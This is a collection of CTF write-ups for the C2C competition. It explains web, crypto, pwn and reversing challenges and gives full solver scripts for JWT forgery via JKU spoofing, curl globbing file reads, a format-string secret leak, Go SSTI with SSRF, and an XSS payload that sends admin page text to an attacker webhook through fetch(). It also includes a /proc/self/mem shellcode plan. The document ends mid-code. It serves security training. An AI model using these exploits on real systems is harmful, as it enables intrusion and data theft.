# C2C CTF Writeups

## Web

### Clicker (100 pts)

**Challenge Description**
Clicker is a file management application that allows users to upload, download, and manage files. It uses RS256 JWTs for authentication and validation.

**Vulnerability**
The application contains multiple vulnerabilities that can be chained together:

1.  **JKU Spoofing**: The JWT verification process fetches the public key from a URL specified in the `jku` header.
2.  **SSRF / Filter Bypass**: The `jku` validation and the admin download feature have weak filters that can be bypassed.
3.  **Curl Injection / Globbing**: The admin download feature uses `curl` in a way that allows local file inclusion via globbing.

**Vulnerable Code**

**JKU Spoofing (`utils/jwt_utils.py`):**
```python
def verify_token(token):
    try:
        unverified = jwt.decode(token, options={"verify_signature": False})
        
        if 'jku' not in unverified:
            return None
        
        jku_url = unverified['jku']
        
        # VULNERABLE: Fetches key from user-controlled URL (after validation)
        jwks_data = fetch_jwks(jku_url) 
        # ...
        for key_data in jwks_data['keys']:
            # ...
            # Validates signature using key from JKU
            decoded = jwt.decode(token, public_key, algorithms=['RS256']) 
            return decoded
```

**Curl Globbing Bypass (`routes/admin.py`):**
```python
@admin_bp.route('/api/admin/download', methods=['POST'])
def download_file():
    # ...
    # Weak protocol check
    blocked_protocols = ['file', ...]
    for proto in blocked_protocols:
        if url_lower.startswith(proto) or (proto + ':') in url_lower:
            return jsonify({'message': f'Blocked protocol: {proto}'}), 400
            
    # ...
    # VULNERABLE: subprocess.run with curl allows globbing characters like {}
    # Passing "{file}:///flag.txt" bypasses the startswith('file') check 
    # but curl expands it to "file:///flag.txt"
    result = subprocess.run(['curl', '-o', output_path, '--', url], 
                          capture_output=True, text=True, timeout=30)
```

**Exploitation**
1.  **JKU Spoofing**:
    *   Host a `jwks.json` and a corresponding public key.
    *   Forge a JWT with the `jku` header pointing to your hosted JWKS.
    *   To bypass the `jku` validation (which allows `localhost`), use a URL like `http://user@localhost@attacker.com/jwks.json`.
    *   Sign the JWT with your private key.
2.  **SSRF / LFI**:
    *   Use the forged Admin JWT to authenticate.
    *   Access `/api/admin/download`.
    *   Send a payload with `url`: `"{file}:///flag.txt"`.
    *   The `curl` command executes `curl -o ... -- {file}:///flag.txt`.
    *   `curl` resolves `{file}` to `file` and retrieves the local flag file.

**Solution**
The provided `solve_clicker.py` script automates the entire exploitation process:
1.  Generates ephemeral RSA keys and a malicious JWKS.
2.  Starts a local HTTP server to host the JWKS.
3.  Starts an `ngrok` TCP tunnel to expose the local server.
4.  Forges an admin JWT with the `jku` header pointing to the ngrok tunnel (bypassing validation using `user@localhost@...`).
5.  Sends the exploit payload to `/api/admin/download` to read the flag using curl globbing.

Run the solver:
```bash

```python
import jwt
import datetime
import requests
import time
import threading
import os
import sys
import json
import base64
from pyngrok import ngrok
import http.server
import socketserver
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Challenge Target
HOST_IP = "challenges.1pc.tf"
TARGET_PORT = 31293
TARGET_URL = f"http://{HOST_IP}:{TARGET_PORT}"

# Local Exploit Server
LOCAL_PORT = 8000

# Fix for datetime.UTC in older python versions
if not hasattr(datetime, 'UTC'):
    datetime.UTC = datetime.timezone.utc

def int_to_base64(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    encoded = base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')
    return encoded

def generate_keys_and_jwks():
    print("[*] Generating ephemeral RSA keys...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()
    
    jwks_data = {
        "keys": [
            {
                "kty": "RSA",
                "kid": "exploit_key",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_base64(public_numbers.n),
                "e": int_to_base64(public_numbers.e)
            }
        ]
    }
    
    # Write JWKS to file for the HTTP server to serve
    with open('exploit_jwks.json', 'w') as f:
        json.dump(jwks_data, f)
        
    return private_pem

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # print(f"[Server] Request: {self.path}")
        if self.path == '/jwks.json':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            if os.path.exists('exploit_jwks.json'):
                with open('exploit_jwks.json', 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b'{}')
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        pass # Silence logs

def start_server():
    # Allow reuse address to avoid "Address already in use" errors on quick restarts
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", LOCAL_PORT), Handler) as httpd:
        print(f"[*] Local server serving at port {LOCAL_PORT}")
        httpd.serve_forever()

def solve():
    # 0. Generate Keys
    private_key_pem = generate_keys_and_jwks()

    # 1. Start Local Server
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    # 2. Start ngrok
    print("[*] Starting ngrok tcp tunnel...")
    public_url = None
    try:
        # User requested 'pyngrok tcp'
        tunnel = ngrok.connect(LOCAL_PORT, "tcp")
        public_url = tunnel.public_url
        print(f"[+] Ngrok Tunnel Created: {public_url}")
    except Exception as e:
        print(f"[-] Ngrok failed: {e}")
        return

    # Extract host and port from tcp://0.tcp.ngrok.io:12345
    # public_url usually is tcp://<host>:<port>
    if public_url.startswith("tcp://"):
        netloc = public_url.replace("tcp://", "")
    else:
        netloc = public_url.replace("http://", "").replace("https://", "")

    # 3. Construct Malicious JKU
    # The vulnerability allows bypassing the allowlist if the URL looks like it has user@localhost
    # Format: http://user@localhost@<attacker_host>:<attacker_port>/jwks.json
    
    jku_url = f"http://user@localhost@{netloc}/jwks.json"
    print(f"[*] Constructed JKU URL: {jku_url}")

    # 4. Generate Admin Token
    print("[*] Generating Admin Token...")

    payload = {
        'user_id': 1337,
        'username': 'admin_hacker',
        'is_admin': True,
        'exp': datetime.datetime.now(datetime.UTC) + datetime.timedelta(hours=1),
        'jku': jku_url
    }
    
    headers = {
        'kid': 'exploit_key'
    }
    
    token = jwt.encode(payload, private_key_pem, algorithm='RS256', headers=headers)
    
    # 5. Send Exploit Request
    print("[*] Sending Exploit Request to Target...")
    
    headers_req = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    
    # Endpoint to exploit: /api/admin/download
    # Payload: globbing to read /flag.txt
    # "{file}:///flag.txt"
    
    data = {
        'url': "{file}:///flag.txt",
        'filename': "flag_exploit.txt",
        'type': 'text',
        'title': 'flag'
    }
    
    try:
        res = requests.post(f"{TARGET_URL}/api/admin/download", json=data, headers=headers_req, timeout=30)
        print(f"[*] Response Status: {res.status_code}")
        
        if res.status_code == 200:
            print("[+] Download successful! Retrieved file content:")
            
            file_url = f"{TARGET_URL}/static/flag_exploit.txt"
            res_file = requests.get(file_url, headers=headers_req)
            
            if res_file.status_code == 200:
                print(f"[+] Content Retrieved:")
                print(res_file.text)
                if "C2C" in res_file.text:
                    print("\n[SUCCESS] FLAG FOUND!")
            else:
                print(f"[-] Failed to retrieve file content. Status: {res_file.status_code}")
        else:
            print(f"[-] Exploit failed. Response: {res.text}")
            
    except Exception as e:
        print(f"[-] Request Error: {e}")

    # Cleanup
    print("[*] Cleaning up...")
    ngrok.disconnect(public_url)
    # Give it a second to close
    time.sleep(1)
    os._exit(0) # Force exit to kill threads

if __name__ == "__main__":
    solve()
```


**Flag**
`C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_0f89c517a261}`

---

### Corp-Mail (100 pts)

**Challenge Description**
A corporate email system allowing registration and login. It uses JWT for authentication and HAProxy for access control.

**Vulnerability**
The application has two main vulnerabilities:
1.  **Format String / Config Leak**: The `format_signature` function uses Python's `str.format()` on user-supplied input. This allows accessing global variables or configuration (like `app.config`) to leak the `JWT_SECRET`.
2.  **HAProxy Bypass**: The HAProxy configuration restricts access to `/admin`, but Flask's routing handles URL normalization differently, allowing bypasses like `/%2fadmin`.

**Vulnerable Code**

**Format String Injection (`utils.py`):**
```python
def format_signature(template, username):
    try:
        # VULNERABLE: attributes of 'current_app' (like config) can be accessed via {app.config}
        from flask import current_app as app
        return template.format(username=username, app=app)
    except Exception:
        return template
```

**Exploitation**
1.  **Leak Config**:
    *   Log in and go to `/settings`.
    *   Set signature to `{app.config}`.
    *   The application renders the signature, dumping the entire configuration including `JWT_SECRET`.
2.  **Forge Admin Token**:
    *   Use the leaked `JWT_SECRET` to sign a new JWT.
    *   Set the payload to have `is_admin=True` (or 1).
3.  **Bypass Proxy & IDOR**:
    *   Use the forged cookie.
    *   Access the admin panel via `/%2fadmin`.
    *   The admin panel exposes an IDOR vulnerability in viewing emails (`/admin/email/<id>`).
    *   Brute-force email IDs to find the flag.

**Solution**
1.  Register/Login.
2.  POST `signature="{app.config}"` to `/settings` and view the page to get `JWT_SECRET`.
3.  Forge an admin JWT.
4.  Access `http://target/%2fadmin/` (HAProxy thinks it's not `/admin`).
5.  Brute-force email IDs to find the flag (usually in emails 1-20).

```python
import requests
import re
import datetime
import jwt # pyjwt
import html

BASE_URL = "http://challenges.1pc.tf:20470"

def register_and_login(s):
    username = "attacker" + datetime.datetime.now().strftime("%H%M%S")
    password = "password123"
    email = f"{username}@example.com"
    r = s.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password,
        "confirm_password": password,
        "email": email
    })
    
    # Login
    r = s.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    if "Invalid credentials" in r.text or "Log In" in r.text or r.status_code != 302:
        return False
    return True

def leak_secret(s):
    payload = "{app.config}"
    s.post(f"{BASE_URL}/settings", data={"signature": payload})
    r = s.get(f"{BASE_URL}/settings")
    text = html.unescape(r.text)
    
    if "JWT_SECRET" in text:
        secret_match = re.search(r"'JWT_SECRET': '([^']+)'", text)
        algo_match = re.search(r"'JWT_ALGORITHM': '([^']+)'", text)
        algo = algo_match.group(1) if algo_match else "HS256"
        if secret_match:
            return secret_match.group(1), algo
    return None, None

def forge_token(secret, algo='HS256'):
    payload = {
        'user_id': 1, 
        'username': 'admin',
        'is_admin': 1,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    }
    return jwt.encode(payload, secret, algorithm=algo)

def get_flag(s):
    working_prefix = "/%2fadmin"
    token = s.cookies.get("token")
    
    for i in range(1, 25):
        url = f"{BASE_URL}{working_prefix}/email/{i}"
        cookies = {'token': token} if token else None
        r = s.get(url, cookies=cookies)
            
        if "C2C{" in r.text:
            match = re.search(r"C2C\{[^}]+\}", r.text)
            if match:
                return match.group(0)
    return None

if __name__ == "__main__":
    s = requests.Session()
    if register_and_login(s):
        print("Logged in")
        secret, algo = leak_secret(s)
        if secret:
            print(f"Leaked secret: {secret}")
            token = forge_token(secret, algo)
            s.cookies.clear()
            s.cookies.set("token", token)
            flag = get_flag(s)
            if flag:
                print(f"FLAG: {flag}")
```

**Flag**
`C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_fc0b7f7463de}`

---

### The Soldier of God, Rick (100 pts)

**Challenge Description**
A Go web application (`rick_soldier`) where users "fight" a boss (Rick). It uses HTML templates and has a hidden internal endpoint.

**Vulnerability**
The challenge suffers from multiple vulnerabilities:
1.  **SSTI**: The `battle_cry` input is injected into the Go template using `fmt.Sprintf` before execution, allowing template injection.
2.  **Integer Overflow**: The `/internal/offer-runes` endpoint (reachable via SSRF through SSTI) takes an `amount` which is converted to an `int` (int64) but assigned to an `int32` HP variable. Sending `2^31 + 1` overflows to a large negative number, killing Rick instantly.
3.  **SSRF**: The `Rick.Scout` method exposed to templates allows making GET requests.

**Vulnerable Code / Payload**
**Concept (Go Template Injection):**
```go
// battle_cry is injected directly
tmpl_str := fmt.Sprintf("Your cry: %s", battle_cry)
t.Parse(tmpl_str)
```

**Payload to trigger SSRF & Overflow:**
```text
{{ .Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount=2147483649" }}
{{ .Secret }}
```

**Exploitation**
1.  **Inject Template**: Input the payload into `battle_cry`.
2.  **Trigger SSRF**: The payload calls `.Rick.Scout("...")`.
3.  **Trigger Overflow**: The SSRF hits the internal `offer-runes` endpoint with `amount=2147483649`.
    *   `2147483649` fits in `int64`.
    *   Cast to `int32` wraps to `-2147483647`.
    *   Rick's HP becomes negative (Dead).
4.  **Get Flag**: The payload then calls `.Secret`, which returns the flag because Rick is dead.

**Solution**
Submit the payload as the battle cry:
`{{ .Rick.Scout "http://127.0.0.1:8080/internal/offer-runes?amount=2147483649" }}{{ .Secret }}`

```python
#!/usr/bin/env python3
import requests
import sys
import re

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <target_url>")
    sys.exit(1)

TARGET = sys.argv[1]
SECRET = "Morty_Is_The_Real_One"
SSRF_URL = "http://127.0.0.1:8080/internal/offer-runes?amount=2147483649"
BATTLE_CRY = '{{ .Rick.Scout "' + SSRF_URL + '" }}{{ .Secret }}'

print(f"[*] Payload: {BATTLE_CRY}")

resp = requests.post(
    f"{TARGET}/fight",
    data={
        "secret": SECRET,
        "battle_cry": BATTLE_CRY,
    },
)

for pattern in [r'C2C\{[^}]+\}', r'flag\{[^}]+\}', r'CTF\{[^}]+\}']:
    matches = re.findall(pattern, resp.text, re.IGNORECASE)
    if matches:
        print(f"\n[+] FLAG FOUND: {matches[0]}")
        break
```

**Flag**
`C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_4b5b915f89de}`

---

### Unsafe Notes (504 pts)

**Challenge Description**
A note-taking application vulnerable to **DOM Clobbering** leading to **XSS**, compounded by a **Login CSRF** vulnerability. The goal is to steal the flag from the admin's notes, but the Admin only views their own notes.

**Vulnerability**
1.  **DOM Clobbering to XSS**: The application uses `domiso` 0.1.1 to sanitize note content. This version is vulnerable to DOM Clobbering, allowing an attacker to bypass the sanitizer and inject malicious attributes (specifically event handlers) by clobbering form attributes.
2.  **Login CSRF**: The login endpoint lacks CSRF protection, allowing an attacker to log a victim into an attacker-controlled account.

**Vulnerable Code**

**Sanitization Bypass (`public/js/app.js`):**
```javascript
import { sanitize } from 'https://cdn.jsdelivr.net/npm/domiso@0.1.1/+esm'

// ...
function renderNotes() {
  // ...
    noteCard.innerHTML = `
      ...
      <div class="note-content">${sanitize(note.content)}</div>
    `;
  // ...
}
```
The `sanitize` function in `domiso` 0.1.1 can be confused by a form with an input named `attributes`. This clobbers the `attributes` property of the form, causing the sanitizer to check the input element instead of the real attributes, bypassing the check.

**Exploitation**
To steal the flag which is present in the admin's notes:

1.  **Window 1 (Flag Holder)**: The Admin bot visits the attacker's site.
    *   It opens **Window 2**.
    *   It navigates itself to `/api/notes` to load the flag into the DOM/Source (since it's logged in as Admin).
2.  **Window 2 (XSS Trigger)**:
    *   It opens **Window 3**.
    *   It navigates itself to the main page `/`.
3.  **Window 3 (CSRF)**:
    *   It performs a Login CSRF (POST to `/api/auth/login`) to log the browser into the **Attacker's account**.
4.  **Execution**:
    *   **Window 2** reloads or renders the Notes App. Since the session is now the Attacker's, it loads the Attacker's notes.
    *   The Attacker's note contains the **DOM Clobbering XSS payload**:
        ```html
        <form id=x style=display:block;content-visibility:auto oncontentvisibilityautostatechange=eval(atob('...'))>
            <input name=attributes>
            <input name=attributes>
        </form>
        ```
    *   The XSS payload executes and accesses `opener.document.body.innerText` (Window 1), which contains the flag.
    *   The payload sends the flag to the attacker's webhook.

**Solution**
The provided `solve.py` script automates the setup:
1. Registers an attacker account.
2. Creates a malicious note with the XSS payload.
3. Hosts the exploit HTML.
4. Sends the exploit URL to the admin bot.

```python
from flask import Flask, request
from pyngrok import ngrok
import threading
import requests
import base64
import random
import string

PORT = 5000
app = Flask(__name__)
HOST = "http://challenges.1pc.tf:42188/"
req = requests.Session()
username = "".join(random.choices(string.ascii_letters, k=10))
password = "".join(random.choices(string.ascii_letters, k=10))
req.post(HOST + "api/auth/register", json={"username": username, "password": password})

def save_payload(public_url):
    cmd = f"fetch('{public_url}/webhook?flag='+opener.document.body.innerText)"
    cmd = base64.b64encode(cmd.encode()).decode()
    xss = f"<form id=x style=display:block;content-visibility:auto oncontentvisibilityautostatechange=eval(atob('{cmd}'))><input name=attributes><input name=attributes></form>"
    req.post(HOST + "api/notes", json={"title": "xss", "content": xss})

@app.route("/")
def index():
    return """
<script>
    setTimeout(() => { window.location = 'http://localhost/api/notes'; }, 1000);
    open('exploit');
</script>
    """

@app.route("/exploit")
def exploit():
    return """
<script>
    setTimeout(() => { window.location = 'http://localhost/'; }, 1000);
    open('csrf');
</script>
    """

@app.route("/csrf")
def csrf():
    return f"""
<form action="http://localhost/api/auth/login" method="POST">
    <input type="text" name="username" value="{username}">
    <input type="text" name="password" value="{password}">
    <input type="submit">
</form>
<script>
    setTimeout(() => {{ document.querySelector('form').submit(); }}, 500);
</script>
    """

@app.route("/webhook", methods=["GET"])
def webhook():
    print("Incoming:", request.args.get("flag"))
    return {"status": "ok"}

def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    public_url = ngrok.connect(PORT, proto="tcp").public_url.replace("tcp://", "http://")
    save_payload(public_url)
    threading.Thread(target=req.get, args=(HOST + f"/visit?url={public_url}",)).start()
```

**Flag**
`C2C{you_are_right_it_is_indeed_very_unsafe_1698141b1832}`

---

## Crypto

### Tet (101 pts)

**Challenge Description**
A cryptography challenge involving a custom cryptosystem running for 12 rounds. We need to recover a hidden value `s` from given outputs `N`, `val_ab`, `f`, `z`, `g`, `U2`.

**Vulnerability**
The cryptosystem leaks too much information (`f`) and uses small parameters (`a`, `b`) relative to the modulus `N`. This allows for a series of attacks: Rational Reconstruction, Lattice Reduction (HNP), and Continued Fractions.

**Vulnerable Code**
**Message Generation (`chall.py`):**
```python
# M1 is shared across rounds
M1 = randbelow(1<<M_BITS) or 1 

def one_round(i):
    p,q=getPrime(BITS),getPrime(BITS)
    # ...
    # a, b are small (1000 bits), N is large (2048 bits)
    a,b,c=rbits(DIF),rbits(DIF),rbits(DIF*6)
    # ...
    # Leaks linear relation e*M1 + c
    f=e*M1+c
    # ...
```

**Exploitation**
1.  **Recover `a` and `b`**: Given `val_ab = a * b^-1 mod N`, and `a, b` are small, use Rational Reconstruction.
2.  **Recover `e` and `M1`**: Given `f_i = e_i * M1 + c_i` for multiple rounds, this is a Hidden Number Problem. Use Lattice Reduction (LLL) to find the unique `M1`.
3.  **Factor `N`**: `e * d = 1 mod phi` implies `k/d approx e/N^3`. Use Continued Fractions to recover `d`.
4.  **Decrypt `U2`**: With `d`, decrypt `U2` to find `s`.

**Solution**
1.  Run the solver script which implements the lattice attack and continued fractions.
2.  Recover the random value `s` for each round.
3.  Submit guesses to the server to get the flag.

```python
from pwn import *
from Crypto.Util.number import getPrime, inverse, long_to_bytes
import math
from math import gcd

# Set up pwntools context
context.log_level = 'debug'

def solve_ab(val, N):
    limit = math.isqrt(N)
    r0, r1 = N, val
    t0, t1 = 0, 1
    while r1 > limit:
        q = r0 // r1
        r0, r1 = r1, r0 - q * r1
        t0, t1 = t1, t0 - q * t1
    a = r1
    b = abs(t1)
    if (b * val) % N == a:
        return a, b
    return None, None

def integer_cbrt(n):
    if n < 0: return -integer_cbrt(-n)
    if n == 0: return 0
    low = 0
    high = 1 << ((n.bit_length() + 2) // 3)
    while low < high:
        mid = (low + high + 1) // 2
        if mid**3 <= n:
            low = mid
        else:
            high = mid - 1
    return low

def solve_d_factor_N(e, N, a, b):
    n, d_val = e, N**3
    numerators = [0, 1]
    denominators = [1, 0]
    BITS = N.bit_length() // 2
    while True:
        if d_val == 0: break
        q_val = n // d_val
        n, d_val = d_val, n % d_val
        num = q_val * numerators[-1] + numerators[-2]
        den = q_val * denominators[-1] + denominators[-2]
        numerators.append(num)
        denominators.append(den)
        if den.bit_length() > BITS + 50:
            break
        candidate_k = num
        candidate_d = den
        if candidate_k == 0: continue
        computed_phi = (e * candidate_d - 1) // candidate_k
        K = computed_phi - a*b - N**3
        delta = K**2 - 4 * b * a * N**3
        if delta >= 0:
            is_square = False
            try:
                sqrt_delta = math.isqrt(delta)
                if sqrt_delta * sqrt_delta == delta:
                    is_square = True
            except: pass
            if is_square:
                x1 = (-K + sqrt_delta) // (2*b)
                x2 = (-K - sqrt_delta) // (2*b)
                for x in [x1, x2]:
                    if x <= 0: continue
                    p_cand = integer_cbrt(x)
                    if p_cand**3 == x:
                        if N % p_cand == 0:
                             q_cand = N // p_cand
                             return candidate_d, p_cand, q_cand
    return None, None, None

from fpylll import IntegerMatrix, LLL

def solve_e_lattice(fs):
    candidates_M = [6705, 6710, 6715, 6700, 6720]
    for LIMIT_BITS in candidates_M:
        M = 1 << LIMIT_BITS
        dim = len(fs)
        basis = []
        row0 = [1]
        for i in range(1, dim):
            val = (fs[i] * M) // fs[0]
            row0.append(val)
        basis.append(row0)
        for i in range(1, dim):
            row = [0] * dim
            row[i] = M
            basis.append(row)
        mat = IntegerMatrix.from_matrix(basis)
        LLL.reduction(mat, delta=0.99)
        for i in range(mat.nrows):
            row = list(mat[i])
            val = abs(row[0])
            if val.bit_length() > 6100 and val.bit_length() < 6200:
                rem = fs[0] % val
                if rem.bit_length() <= 6020:
                    return val
    return None

def main():
    try:
        sys.set_int_max_str_digits(50000)
    except: pass
    io = remote("challenges.1pc.tf", 20635)
    rounds_data = []
    for i in range(1, 13):
        io.recvuntil(f"=== Round {i}/12 ===".encode())
        io.recvuntil(b"N = ")
        N = int(io.recvline().strip(), 16)
        io.recvuntil(b"a/b = ")
        val_ab = int(io.recvline().strip(), 16)
        io.recvuntil(b"f = ")
        f = int(io.recvline().strip(), 16)
        io.recvuntil(b"z = ")
        z = int(io.recvline().strip(), 16)
        io.recvuntil(b"g = ")
        g = int(io.recvline().strip(), 16)
        io.recvuntil(b"U2 = ")
        U2 = int(io.recvline().strip(), 16)
        rounds_data.append({'i': i, 'N': N, 'val_ab': val_ab, 'f': f, 'z': z, 'g': g, 'U2': U2})
        print(f"Collected Round {i}")

    for r in rounds_data:
        r['a'], r['b'] = solve_ab(r['val_ab'], r['N'])

    fs = [r['f'] for r in rounds_data]
    e1 = solve_e_lattice(fs)
    r1 = rounds_data[0]
    M1_candidate = r1['f'] // e1
    guesses = []
    for r in rounds_data:
        e = r['f'] // M1_candidate
        d, p, q = solve_d_factor_N(e, r['N'], r['a'], r['b'])
        phi_N = (p-1)*(q-1)
        d_inv = inverse(d, N * phi_N)
        base = pow(r['U2'], d_inv, r['N']**2)
        s = base % r['N']
        guesses.append(s)

    for g_val in guesses:
        io.sendlineafter(b">> ", str(g_val).encode())
        if b"Nice" not in io.recvline():
            return
    print(io.recvall().decode())

if __name__ == "__main__":
    main()
```

**Flag**
`C2C{3f3fe040fee1}`

---

### AIC Gachapon (100 pts)

**Challenge Description**
The challenge features a .NET web application where users can play a gachapon game. Winning a rare prize (redeem code) requires predicting the output of the server's Random Number Generator (RNG).

**Vulnerability**
The application uses the standard .NET `System.Random` class. In .NET Core and .NET 5+, `System.Random` defaults to a Knuth subtractive generator (lagged Fibonacci generator) for compatibility if initialized with a seed. This RNG is not cryptographically secure and its internal state (56 integers) can be reconstructed if enough consecutive outputs are known.
The `/api/frame` endpoint leaks 16 consecutive `Next(int.MaxValue)` outputs in the `sampleInts` array, which correspond directly to the internal state.

**Exploitation**
1.  **State Recovery**: Collect approximately 12-30 consecutive frames from `/api/recent` to obtain a large enough sample of the RNG output stream.
2.  **Recurrence Relation**: Use the recurrence $x_n = (x_{n-55} - x_{n-34}) \pmod{2^{31}-1}$ to propagate the known values and recover the full 56-element state array.
3.  **Prediction**: Once the state is recovered, advance the RNG to the current server tick and predict the `RedeemCode` (generated via `Next(MBIG) * 10,000,000`).
4.  **Submission**: Submit the predicted code to `/api/redeem` to get the flag.

**Solution**
The exploit script automates frame collection, state reconstruction via backward/forward propagation, and prediction.

```python
import requests

MBIG = 2147483647

def solve(server_url):
    # 1. Collect recent frames
    frames = requests.get(f"{server_url}/api/recent/30").json()
    
    # 2. Reconstruct RNG state stream 's' using:
    # x_n = (x_{n-55} - x_{n-34}) % MBIG
    # ... constraint propagation ...

    # 3. Predict next code
    target_idx = current_tick_offset + 24
    predicted_code = int(s[target_idx] * (1.0/MBIG) * 10000000)
    
    # 4. Redeem
    res = requests.post(f"{server_url}/api/redeem", 
                        json={"tickId": current_tick, "code": predicted_code})
    print(res.json().get('flag'))
```

**Flag**
`C2C{0a0628bc8d88}`

---

### Bigguy (104 pts)

**Challenge Description**
The challenge `bigguy` provides an encryption service using AES in Counter (CTR) mode. It splits the flag into two parts (`FLAG1`, `FLAG2`) and encrypts them using IVs derived from a randomly generated `big_guy` array. It implements a "plagiarism check" to prevent users from reusing IVs that are too similar to previously used ones (specifically, rejecting IVs that differ by 3 bytes or fewer).

**Vulnerability**
The core vulnerability lies in the interaction between the AES-CTR mode and the plagiarism check:
1.  **AES-CTR Counter Reuse**: In CTR mode, the counter is initialized from the IV and increments for each block. If two IVs are close in integer value, their counter sequences will overlap.
2.  **Weak Plagiarism Check**: The check `xor(a, b).count(0) > 13` allows IVs that differ in exactly 3 bytes to pass.
3.  **Exploit**: By modifying the Least Significant Bits (LSB) of the last 3 bytes of the `big_guy` IV, we can create a forged IV `V` that passes the plagiarism check but has a counter value very close to the original `big_guy`.

**Exploitation Strategy**
1.  **Connect** to the challenge and retrieve the `big_guy` array.
2.  **Forge IV**: Construct `V` by flipping the LSB of the last 3 bytes (indices 13, 14, 15) of `big_guy`. This ensures 3 bytes differ, passing the check.
3.  **Send Payload**: Request encryption with IV `V` and a large plaintext (e.g., 70,000 blocks of 'A's).
    *   This generates a keystream starting at `h(V)`.
    *   Since `h(V)` is close to `h(big_guy)`, the keystream will eventually overlap with the keystream used to encrypt `FLAG1`.
    *   Crucially, the offset `delta = h(big_guy) - h(V)` is identical to the offset `h(pants) - h(V_pants)`, allowing recovery of `FLAG2` at the exact same offset.
4.  **Scan & Decrypt**:
    *   Scan the `ct_big` ciphertext for the known flag header "C2C{".
    *   Once the offset is found, decrypt `FLAG1`.
    *   Use the same offset to decrypt `FLAG2` from `ct_pants`.

**Solution Script**
The `solve.py` script automates this process.

```python
from pwn import *
import json
import ast

def solve():
    # ... setup ...
    p = remote('challenges.1pc.tf', 24785)
    
    # ... read big_guy and encrypted flags ...
    
    # Forge IV by flipping 3 bits
    v = list(big_guy)
    for idx in [13, 14, 15]:
        v[idx] ^= 1
        
    # Request massive encryption to overlap keystream
    req = {"options": "encrypt", "plaintext": 'A' * 1120000, "iv": v}
    p.send(json.dumps(req) + '\n')
    
    # ... scan ct_big for "C2C{" XORed with 'A' and flag1_ct ...
    # ... decrypt flag1 and flag2 at recovered offset ...
```

**Flag**
`C2C{5d6d98ac-68de-4257-9e3a-59686514d0fd9a0e0ca79875}`

---

## Pwn

### NS3 (104 pts)

**Challenge Description**
A generic HTTP server written in C++ that handles file operations. It allows users to GET and PUT files relative to the current directory but attempts to restrict access.

**Vulnerability**
The application suffers from **Path Traversal** vulnerabilities in both `process_get` and `process_put` functions. The `path` parameter from the HTTP request is used directly in `open()` calls without sufficient sanitization, allowing an attacker to traverse directories using `../`.

**Vulnerable Code**
The vulnerabilties exist in `src/server.cpp`.

**Arbitrary File Read (`process_get`):**
```cpp
void Server::process_get(int client_fd, const std::string &path, size_t offset, size_t size, bool has_size, bool has_offset)
{
    // VULNERABLE: path is used directly in open() without validation against directory traversal
    int fd = open(path.c_str(), O_RDONLY);
    if (fd < 0)
    {
        send_response(client_fd, 404, "Not Found", "File not found");
        return;
    }
    // ...
}
```

**Arbitrary File Write (`process_put`):**
```cpp
void Server::process_put(int client_fd, const std::string &path, size_t offset, const std::string &content)
{
    // VULNERABLE: path is used directly in open() with O_CREAT | O_WRONLY
    int fd = open(path.c_str(), O_WRONLY | O_CREAT, 0644);
    if (fd < 0)
    {
        send_response(client_fd, 500, "Internal Server Error", "Could not open file");
        return;
    }
    // ...
}
```

**Exploitation**
To achieve Remote Code Execution (RCE) and retrieve the flag, we use the following strategy:

1.  **Leak Memory Map**: Send `GET /?path=../../../../proc/self/maps` to read the memory layout of the process. This leaks the base address of the server (ASLR bypass).
2.  **Download Binary**: Send `GET /?path=../../../../proc/self/exe` to retrieve the server binary. This allows us to find the offset of internal functions.
3.  **Overwrite Text Segment**: Since the server runs as a process that can write to its own memory via `/proc/self/mem`, we can bypass W^X protection.
    *   Target function: `Server::send_response`. This function is called at the end of `process_put`.
    *   Payload: Shellcode that reuses the socket (FD 3-10) and executes `/bin/sh` or `cat /flag*`.
4.  **Trigger Execution**:
    *   Send a `PUT` request to `/?path=../../../../proc/self/mem&offset=<target_address>`.
    *   The body of the request contains the shellcode.
    *   The server writes the shellcode to the address of `send_response`.
    *   The server then calls `send_response`, executing our shellcode.

**Solution**
The provided `solve.py` automates this process:
1.  Downloads the binary (if not present).
2.  Leaks ASLR base from `/proc/self/maps`.
3.  Calculates the target address of `send_response`.
4.  Constructs shellcode to reuse the connection and execute `cat /flag*`.
5.  Sends the exploit and prints the flag.

**Flag**
`C2C{lINux_Fi1e_SyS7Em_1S_qU1te_MlND_8lowlng_l5n't_lT_9f614b3b839b?}`

---

## Reverse

### Bunaken (100 pts)

**Challenge Description**
A Reverse Engineering challenge featuring a binary (`bunaken`) that is actually a Bun runtime executable with a bundled JavaScript payload. The goal is to reverse the logic and decrypt the flag file `flag.txt.bunakencrypted`.

**Vulnerability**
The encryption logic is embedded in the JavaScript payload. It uses a weak key derivation function (`SHA-256("sulawesi")`) and `AES-CBC` encryption.

**Vulnerable Code**
Recovered JavaScript logic (deobfuscated):

```javascript
// Key Derivation
let passphrase = "sulawesi";
